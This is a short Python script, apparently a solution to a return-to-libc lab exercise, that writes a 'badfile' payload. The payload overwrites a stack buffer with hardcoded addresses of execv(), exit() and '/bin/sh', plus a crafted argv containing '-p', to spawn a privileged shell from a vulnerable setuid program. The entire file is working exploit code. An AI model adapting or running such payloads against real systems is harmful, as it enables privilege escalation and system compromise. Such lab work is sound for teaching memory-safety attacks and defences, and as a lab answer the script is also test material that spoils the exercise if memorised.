#!/usr/bin/env python3
import sys

# Fill content with non-zero values

input_addr = 0xffffcd90
L = 4
offset = 98

# store -p
content = bytearray(0xaa for i in range(300))
content[offset+20:offset+24] = (0).to_bytes(4,byteorder='little')
content[offset+20:offset+23] = b"-p"

X = 90
sh_addr = 0xffffd3f6       # The address of "/bin/sh"
p_addr = input_addr+offset+20        # The address of -p
content[X:X+4] = (sh_addr).to_bytes(4,byteorder='little')

Y = 82
system_addr = 0xf7e994b0   # The address of execv()
content[Y:Y+4] = (system_addr).to_bytes(4,byteorder='little')

Z = 86
exit_addr = 0xf7e04f80     # The address of exit()
content[Z:Z+4] = (exit_addr).to_bytes(4,byteorder='little')

# the second paramemter of execv
A = 94
argv_addr = input_addr+offset     # &input + offset
# argv_addr_addr = argv_addr+1
content[A:A+4] = (argv_addr).to_bytes(4,byteorder='little')

# construct argv
content[offset:offset+4] = (sh_addr).to_bytes(L,byteorder='little')
content[offset+4:offset+8] = (p_addr).to_bytes(L,byteorder='little')
content[offset+8:offset+12] = (0).to_bytes(L,byteorder='little')


# Save content to a file
with open("badfile", "wb") as f:
  f.write(content)
